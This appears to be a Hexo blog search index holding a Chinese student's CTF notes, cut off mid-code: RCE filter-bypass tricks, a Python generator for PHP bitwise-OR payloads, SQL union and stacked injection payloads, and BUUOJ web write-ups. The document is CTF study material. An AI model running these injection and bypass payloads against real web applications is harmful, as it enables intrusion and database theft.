<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello world!</title>
    <url>/2022/01/16/blog0000-hello-world/</url>
    <content><![CDATA[<h2 id="写在前面的一些话"><a href="#写在前面的一些话" class="headerlink" title="写在前面的一些话"></a>写在前面的一些话</h2><p>Welcome to my blog!</p>
<span id="more"></span>
<p>这里是whistleH的博客世界，开这个博客的最初目的是大一暑假学的东西太多太杂，希望自己搭一个博客来记录一下自己学习历程。</p>
]]></content>
      <tags>
        <tag>preface</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE中的绕过总结（持续更新中）</title>
    <url>/2021/09/14/blog0001-rce%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="一、空格绕过"><a href="#一、空格绕过" class="headerlink" title="一、空格绕过"></a>一、空格绕过</h2><h3 id="1、URL编码绕过"><a href="#1、URL编码绕过" class="headerlink" title="1、URL编码绕过"></a>1、URL编码绕过</h3><p>空格在URL编码中为%20</p>
<p>当空格被过滤时，我们可以使用%09（tab）或者%0a（回车）绕过</p>
<p>Attention : 使用%0a时考虑是代码执行还是命令执行,如PHP中调用system()函数，如果使用%0a无法实现效果]</p>
<span id="more"></span>
<h3 id="2、shell变量绕过"><a href="#2、shell变量绕过" class="headerlink" title="2、shell变量绕过"></a>2、shell变量绕过</h3><p>在Linux bash中，我们可以使用shell中预设的变量来绕过空格</p>
<p>如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">tac$</span><span class="bash">&#123;IFS&#125;flag.php</span></span><br><span class="line"><span class="meta">tac$</span><span class="bash">IFS<span class="variable">$1flag</span>.php</span></span><br><span class="line"><span class="meta">tac$</span><span class="bash">IFS<span class="variable">$9flag</span>.php</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意，kali默认为zsh环境，此时效果不一定成功</span></span><br></pre></td></tr></table></figure>
<h3 id="3、其他特殊符号替代"><a href="#3、其他特殊符号替代" class="headerlink" title="3、其他特殊符号替代"></a>3、其他特殊符号替代</h3><p>当上述方法被禁止的时候，我们可以考虑使用shell特殊符号</p>
<p>如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tac&lt;flag.php #代替 tac flag.php</span><br><span class="line">tac&lt;&gt;flag.php</span><br></pre></td></tr></table></figure>
<h2 id="二、敏感词绕过"><a href="#二、敏感词绕过" class="headerlink" title="二、敏感词绕过"></a>二、敏感词绕过</h2><h3 id="1、通配符绕过"><a href="#1、通配符绕过" class="headerlink" title="1、通配符绕过"></a>1、通配符绕过</h3><p>Linux bash常见的通配符：</p>
<ul>
<li>* ：匹配任意个字符</li>
<li>？：匹配单个字符</li>
</ul>
<p>如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">绕过简单的敏感词，实现文件的打开操作</span></span><br><span class="line">tac fla*  #</span><br><span class="line">tac fla?.php  #</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">字母被过滤时</span></span><br><span class="line">???/????64 ????.??? </span><br><span class="line"><span class="meta">#</span><span class="bash">等价于实现了 bin/base64 flag.php</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">参考案例(题源 ctfshow web入门 55)</span></span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span></span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2、shell字符串拼接"><a href="#2、shell字符串拼接" class="headerlink" title="2、shell字符串拼接"></a>2、shell字符串拼接</h3><p>Linux中shell字符串是可以拼接的,并且不需要额外的运算符。</p>
<p>那么我们可以得到以下3条等价的语句。</p>
<p>需要注意的是，如果第3条语句没有加上${}的分隔，将会被系统认为是$ag，这样得不到正确的结果</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tac /flag.png</span><br><span class="line">a=ag.png;tac /fl$a</span><br><span class="line">a=ag.pn;tac /fl$&#123;a&#125;g</span><br></pre></td></tr></table></figure>
<p>有了以上的知识，我们可以构造更为简单的payload,我们不需要引入额外的shell变量，直接利用“”这样的空字符串来实现拼接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tac /fl&quot;&quot;ag.png</span><br><span class="line">tac /fla&#x27;&#x27;g.png</span><br></pre></td></tr></table></figure>
<h3 id="3、shell反斜杠转义"><a href="#3、shell反斜杠转义" class="headerlink" title="3、shell反斜杠转义"></a>3、shell反斜杠转义</h3><p>shell中反斜杠是去除转移字符的特殊含义，这个与大多数的语言类似。</p>
<p>当反斜杠后接正常字符，在shell中相当于不处理。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 以下两个句子在shell测试，发现两者输出相同</span></span><br><span class="line">echo flag.php</span><br><span class="line">echo fla\g.php</span><br></pre></td></tr></table></figure>
<h3 id="3、管道运算符的运用"><a href="#3、管道运算符的运用" class="headerlink" title="3、管道运算符的运用"></a>3、管道运算符的运用</h3><p><a href="https://blog.csdn.net/weixin_43460822/article/details/101622147">Linux 的 管道运算符+%0a</a></p>
<h3 id="4、文件读取"><a href="#4、文件读取" class="headerlink" title="4、文件读取"></a>4、文件读取</h3><p><a href="https://blog.csdn.net/JC_xxx/article/details/108921607">Linux 的文件读取指令 + grep</a></p>
<h3 id="5、eval逃逸"><a href="#5、eval逃逸" class="headerlink" title="5、eval逃逸"></a>5、eval逃逸</h3><p>这个其实用处不是很大，大意如下，也就是将对c的过滤转移出去，这样可以在a上实现rce</p>
<p>（这个思路还是很有意思的，2021极客大挑战反弹shell那道题就可以利用类似的思路开两个端口来实现真正的反弹shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">post: </span><br><span class="line">c = <span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]);</span><br><span class="line">a = system(<span class="string">&#x27;ls&#x27;</span>);    </span><br></pre></td></tr></table></figure>
<h2 id="三、位运算绕过"><a href="#三、位运算绕过" class="headerlink" title="三、位运算绕过"></a>三、位运算绕过</h2><p>当字母和数字被过滤的时候，我们有的时候也可以考虑用PHP字符串位运算绕过的形式。</p>
<p>在PHP中”abc”|”abc”会将两个字符串转成ASCII二进制形式，如0x616263|0x616263 = 0x616263 </p>
<p>例题ctfshow(web 41)：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>分析题目我们发现可以 | 运算符以及引号没有被过滤，因此我们可以选择使用位运算绕过。</p>
<p>我们要注意的是，如果我们只是将system(‘ls’)通过位运算实现，这样的话输出的结果只会是 system(‘ls’), PHP会在eval中计算得到的字符串，但是并不会执行这样的语句。等价于，eval执行的是echo(“system(‘ls’)”);</p>
<p>要在PHP中利用字符串实现调用函数。我们可以先做个小实验：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);            <span class="comment">//错误信息</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_startup_errors&#x27;</span>,<span class="number">1</span>);    <span class="comment">//php启动错误信息</span></span><br><span class="line">error_reporting(-<span class="number">1</span>);                    <span class="comment">//打印出所有的 错误信息</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">customError</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span></span>)</span>&#123; </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;b&gt;Error:&lt;/b&gt; [<span class="subst">$errno</span>] <span class="subst">$errstr</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//set error handler</span></span><br><span class="line">set_error_handler(<span class="string">&quot;customError&quot;</span>);</span><br><span class="line"><span class="variable">$c</span> = (<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="string">&quot;(&#x27;\x13\x19\x13\x14\x05\x0d&#x27;|&#x27;\x60\x60\x60\x60\x60\x60&#x27;)(&#x27;\x0c\x13&#x27;|&#x27;\x60\x60&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$d</span>);&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>当利用eval执行时，$d从字符串变为执行语句（直观点的理解就是最外层的引号没了），等价于$c。</p>
<p>最后附上py脚本（如果只是一次的话，没必要生成文件，直接生成字典就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">formDictionary</span>():</span></span><br><span class="line">    ch_sum = []</span><br><span class="line">    <span class="comment"># 找到符合条件的字符</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">        ch = <span class="built_in">chr</span>(i)</span><br><span class="line">        re1 = re.match(<span class="string">r&quot;[0-9]|[a-z]|[A-Z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&quot;</span>,ch)</span><br><span class="line">        <span class="keyword">if</span>(re1 == <span class="literal">None</span>):</span><br><span class="line">            ch_sum.append(ch)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dic.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fout:</span><br><span class="line">        result= []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> ch_sum:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> ch_sum:</span><br><span class="line">                x = <span class="built_in">ord</span>(i)|<span class="built_in">ord</span>(j)</span><br><span class="line">                <span class="keyword">if</span>(x&gt;=<span class="number">32</span> <span class="keyword">and</span> x&lt;=<span class="number">126</span> <span class="keyword">and</span> (<span class="keyword">not</span> x <span class="keyword">in</span> result)):</span><br><span class="line">                    result.append(x)</span><br><span class="line">                    <span class="comment">#warning 这可能导致无法构造出\t,字符串split</span></span><br><span class="line">                    fout.write(<span class="string">&quot;%&#123;:0&gt;2x&#125;\t%&#123;:0&gt;2x&#125;\t&#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(i),<span class="built_in">ord</span>(j),<span class="built_in">chr</span>(x)))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">formStr</span>(<span class="params">s</span>):</span></span><br><span class="line">    s1=<span class="string">&quot;&quot;</span></span><br><span class="line">    s2=<span class="string">&quot;&quot;</span></span><br><span class="line">    dic = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dic.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">for</span> lines <span class="keyword">in</span> fin:</span><br><span class="line">            elem = (lines.split(<span class="string">&#x27;\t&#x27;</span>))</span><br><span class="line">            dic[elem[-<span class="number">1</span>].replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)] = (elem[<span class="number">0</span>],elem[<span class="number">1</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span>(dic.get(i)!=<span class="literal">None</span>):</span><br><span class="line">                s1 += dic[i][<span class="number">0</span>]</span><br><span class="line">                s2 += dic[i][<span class="number">1</span>]</span><br><span class="line">               <span class="comment"># print(&quot;&#123;&#125; : &#123;&#125;|&#123;&#125;&quot;.format(i,dic[i][0],dic[i][1]))</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                sys.exit(<span class="string">&quot;No answer&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;(\&#x27;&quot;</span>+s1+<span class="string">&quot;\&#x27;|\&#x27;&quot;</span>+s2+<span class="string">&quot;\&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    formDictionary()</span><br><span class="line">    s0 = <span class="built_in">input</span>(<span class="string">&quot;function : &quot;</span>)</span><br><span class="line">    s1 = <span class="built_in">input</span>(<span class="string">&quot;argc : &quot;</span>)</span><br><span class="line">    s0_encode= formStr(s0)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> s1 == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        s1_encode = <span class="string">&quot;()&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s1_encode=formStr(s1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># warning : eval()需要补充 -&gt; ;</span></span><br><span class="line">    <span class="built_in">print</span>(s0_encode+s1_encode + <span class="string">&quot;;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># data=&#123;</span></span><br><span class="line">    <span class="comment">#    &#x27;cmd&#x27;:urllib.parse.unquote(s0_encode + s1_encode + &quot;;&quot;)		#注意使用quote</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line">    <span class="comment"># proxies = &#123;</span></span><br><span class="line">    <span class="comment">#     &quot;http&quot; : &quot;127.0.0.1:8080&quot;</span></span><br><span class="line">    <span class="comment">#     #&quot;http:&quot; : &quot;127.0.0.1:8080&quot;</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># warning: 采用字符串的方式避免urlencode</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data1 = <span class="string">&quot;cmd=&quot;</span> + s0_encode + s1_encode + <span class="string">&quot;;&quot;</span></span><br><span class="line"></span><br><span class="line">    r = requests.post(url=<span class="string">&quot;http://localhost/www.mytest.cn/&quot;</span>,data=data1,headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>rce</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>rce</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入笔记</title>
    <url>/2022/03/31/blog0002-SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="一、联合注入"><a href="#一、联合注入" class="headerlink" title="一、联合注入"></a>一、联合注入</h2><h3 id="1、基本说明"><a href="#1、基本说明" class="headerlink" title="1、基本说明"></a>1、基本说明</h3><p>SQL注入中最经典的就是联合查询，先上经典三板斧</p>
<p>联合注入的手段还是很多的，但是都大同小异，主要还是从information_schema这个存放mysql信息的数据库下手。</p>
<span id="more"></span>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破库名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破表名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;database_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破列名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;database_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破内容</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,&#123;column_name&#125;,<span class="number">0x5c</span>,&#123;colunm_name&#125;) <span class="keyword">from</span> &#123;database_name&#125;.&#123;table_name&#125;);</span><br><span class="line"># 注意， 爆破内容时我们要考虑引号的问题</span><br><span class="line"># 补一个爆破内容的例子：</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,id,<span class="number">0x5c</span>,name) <span class="keyword">from</span> whistle.user);</span><br></pre></td></tr></table></figure>
<p>联合查询是入门的SQL注入姿势，通常只有面对没有部署任何waf的Web才能奏效。</p>
<h3 id="2、补充"><a href="#2、补充" class="headerlink" title="2、补充"></a>2、补充</h3><p>在联合查询时，我们构造payload要注意让前一个查询语句没有查询结果。</p>
<p>这是在实际情况中，往往Web只会显示查询到的第一条信息，</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> ......</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span></span><br></pre></td></tr></table></figure>
<p>这里我们可以清楚发现前者屏蔽了正常查询的结果，使得我们的payload注入结果能够正常显示。</p>
<h2 id="二、堆叠注入"><a href="#二、堆叠注入" class="headerlink" title="二、堆叠注入"></a>二、堆叠注入</h2><h3 id="1、说明"><a href="#1、说明" class="headerlink" title="1、说明"></a>1、说明</h3><p>堆叠注入的经典案例就是强网杯2019的“随便注”（XCTF和BUUOJ都有环境复现</p>
<p>大致的原理和RCE中的管道运算符注入一样。</p>
<h3 id="2、补充-1"><a href="#2、补充-1" class="headerlink" title="2、补充"></a>2、补充</h3><p>先上”随便注”的payload</p>
<p>这里过滤了select 和 prepare，后者大小写非常好绕过（不用正则还是太年轻</p>
<p>前者我们这里使用了设置变量的方法，成功绕过了select的注入问题</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span><span class="operator">=</span>concat(<span class="string">&#x27;sel&#x27;</span>,<span class="string">&#x27;ect * from `1919810931114514`&#x27;</span>);<span class="keyword">Prepare</span> uut <span class="keyword">from</span> <span class="variable">@sql</span>; <span class="keyword">execute</span> uut;  <span class="comment">-- - </span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ctf</category>
        <category>web</category>
        <category>sql</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>Buuoj WP(Web方向-1)</title>
    <url>/2021/11/22/blog0003-buuoj-web-wp-1/</url>
    <content><![CDATA[<h2 id="1、Roar-CTF-Easy-Calc"><a href="#1、Roar-CTF-Easy-Calc" class="headerlink" title="1、Roar-CTF Easy Calc"></a>1、Roar-CTF Easy Calc</h2><p>这题打开界面是一个计算表达式的网页</p>
<p>首先，检查前端代码，发现前端向后端 calc.php 发送数据部署了WAF</p>
<span id="more"></span>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    $(<span class="string">&#x27;#calc&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">            <span class="attr">url</span>:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).val()),</span></span><br><span class="line"><span class="javascript">            <span class="attr">type</span>:<span class="string">&#x27;GET&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            <span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                $(<span class="string">&quot;#result&quot;</span>).html(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="javascript">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span></span><br><span class="line"><span class="string"><span class="javascript">            &lt;/div&gt;`</span>);</span></span><br><span class="line"><span class="javascript">            &#125;,</span></span><br><span class="line"><span class="javascript">            <span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;这啥?算不来!&quot;</span>);</span></span><br><span class="line"><span class="javascript">            &#125;</span></span><br><span class="line"><span class="javascript">        &#125;)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">    &#125;)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>打开calc.php，发现PHP代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>首先发送一个phpinfo()测试，发现返送回来一个403，基本可以判定部署的WAF/IDS会对url里的参数进行检查，对于含有英文字符的直接屏蔽，只能发送数字和运算符号。</p>
<h3 id="PHP请求参数解析漏洞"><a href="#PHP请求参数解析漏洞" class="headerlink" title="PHP请求参数解析漏洞"></a>PHP请求参数解析漏洞</h3><p>利用PHP的请求参数解析漏洞</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//node4.buuoj.cn:28838/calc.php?num=phpinfo()</span></span><br><span class="line">http:<span class="comment">//node4.buuoj.cn:28838/calc.php? num=phpinfo()</span></span><br></pre></td></tr></table></figure>
<p>当发送这两个变量时，都会在PHP内部解析为“num”变量（PHP解析时自动忽略前置空格）</p>
<p>因此我们利用这招绕过了url上的字母检查，达到PHP内部实现RCE</p>
<p>ban了这么多东西不要紧，我们还是可以利用PHP的内部函数来绕过</p>
<p>（PHP的原生函数在RCE受限的情况下还是非常有用的，用起来也需要一定的熟练度和脑洞）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">num=var_dump(scandir(chr(<span class="number">47</span>)))</span><br><span class="line">num=var_dump(readfile(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure>
<p>成功拿到flag。</p>
<h3 id="HTTP请求走私"><a href="#HTTP请求走私" class="headerlink" title="HTTP请求走私"></a>HTTP请求走私</h3><p>我们当然也可以尝试使用HTTP请求走私的方法去绕过url的检查。（主要利用HTTP的分块传输chunked知识点）</p>
<p>参考资料:</p>
<p><a href="https://virusday.github.io/2020/11/27/http%E7%BC%96%E7%A0%81%E7%BB%95waf/%E7%BC%96%E7%A0%81%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95waf/">https://virusday.github.io/2020/11/27/http%E7%BC%96%E7%A0%81%E7%BB%95waf/%E7%BC%96%E7%A0%81%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95waf/</a></p>
<p>HTTP请求走私：</p>
<p><a href="https://websec.readthedocs.io/zh/latest/vuln/httpSmuggling.html">https://websec.readthedocs.io/zh/latest/vuln/httpSmuggling.html</a></p>
<p><a href="https://xz.aliyun.com/t/6654#toc-1%5D">https://xz.aliyun.com/t/6654#toc-1%5D</a></p>
<h2 id="2、Ez-ByPass——MD5强碰撞"><a href="#2、Ez-ByPass——MD5强碰撞" class="headerlink" title="2、Ez_ByPass——MD5强碰撞"></a>2、Ez_ByPass——MD5强碰撞</h2><p>这道题就是PHP特性题，当然MD5强碰撞还是第一次遇见，在这里记录一下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="variable">$id</span>) === md5(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span> (!is_numeric(<span class="variable">$passwd</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span 